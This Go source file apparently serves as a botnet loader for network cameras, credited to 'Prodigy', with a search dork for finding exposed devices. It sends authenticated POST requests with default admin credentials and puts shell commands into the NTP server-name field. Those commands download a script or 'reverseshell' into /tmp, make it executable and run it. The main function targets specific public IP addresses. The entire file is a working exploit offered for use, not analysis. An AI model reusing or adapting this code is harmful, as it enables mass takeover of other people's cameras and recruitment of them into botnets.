// https://www.zoomeye.org/searchResult?q=%22Basic%20realm%3D%5C%22Network%20Camera%5C%22%22
// ;$(wget http://1.1.1.1/test)
// `wget http://1.1.1.1/test`
// `wget http://1.1.1.1/$(uname -m)`
// ;$(cd /tmp; wget http://1.1.1.1/sh; chmod 777 sh; sh sh)
// `cd /tmp; wget http://1.1.1.1/reverseshell -O 1`
// http://82.76.135.73:81/setup.asp?r=20140714

/*

loader made by Prodigy and dorks found by benshii.

*/

package main

import (
	"net"
	"time"
	"fmt"
	"strconv"
	//"strings"
)

//var payload = "`wget+http%3a//1.1.1.1/sh+-O-|sh`"
//var payload = "`wget+http%3a//1.1.1.1/sh`"
var payload = "action=update&ipcamSource=%2Fntp.asp%3Fr%3D20130724&NTP_enable=1&NTP_serverName=%60wget+http%3A%2F%2F1.1.1.1%2Fpoo%2Fm+-O-%7Csh%60&NTP_tzCityNo=16&NTP_tzMinute=0&NTP_daylightSaving=0"
var payload1 = "action=update&ipcamSource=%2Fntp.asp%3Fr%3D20130724&NTP_enable=1&NTP_serverName=%3b$(cd+/tmp%3b+wget+http%3a//1.1.1.1/sh%3b+chmod+777+sh%3b+sh+sh)&NTP_tzCityNo=16&NTP_tzMinute=0&NTP_daylightSaving=0"

func poc(target string) {
	var buffer = [256]byte{}
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return
	}
	
	//conn.Write([]byte("GET / HTTP/1.1\r\nHost: "+ target +"\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n"))

	//conn.Read(buffer[:])

	//if strings.Contains(string(buffer[:]), "200") {
		fmt.Println("len:", len(payload))
		//conn.Write([]byte("POST /camera-cgi/admin/param.cgi HTTP/1.1\r\nHost: "+ target +"\r\nContent-Length: "+ strconv.Itoa(len(payload)) +"\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://84.244.116.3:81/ntp.asp?r=20140408_1683324821461\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n"+ payload +"\r\n\r\n"))
		conn.Write([]byte("POST /camera-cgi/admin/param.cgi HTTP/1.1\r\nHost: "+ target +"\r\nContent-Length: "+ strconv.Itoa(len(payload1)) +"\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://84.244.116.3:81/ntp.asp?r=20140408_1683324821461\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n"+ payload1 +"\r\n\r\n"))
		//conn.Write([]byte("POST /camera-cgi/admin/param.cgi HTTP/1.1\r\nHost: "+ target +"\r\nContent-Length: 187\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://84.244.116.3:81/ntp.asp?r=20140408_1683324821461\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\naction=update&ipcamSource=%2Fntp.asp%3Fr%3D20130724&NTP_enable=1&NTP_serverName=%60wget+http%3A%2F%2F1.1.1.1%2Fpoo%2Fm+-O-%7Csh%60&NTP_tzCityNo=16&NTP_tzMinute=0&NTP_daylightSaving=0\r\n\r\n"))
		conn.Read(buffer[:])
		fmt.Println("buffer:", string(buffer[:]))
	//}

	//fmt.Println("buffer:", string(buffer[:]))
}

func main() {
	//poc("90.146.182.130:81")
	poc("84.154.125.253:81")
	//poc("84.158.227.182:81")
	//poc("84.244.116.3:81")
}
